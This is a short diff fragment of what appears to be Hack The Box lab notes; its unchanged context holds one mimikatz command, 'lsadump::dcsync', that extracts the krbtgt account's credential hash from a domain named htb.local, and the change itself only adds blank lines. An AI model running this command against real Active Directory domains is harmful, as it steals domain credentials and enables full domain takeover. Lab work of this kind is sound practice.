@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:26:28.919989+00:00'
 ```bash
 mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
 ```
+
+
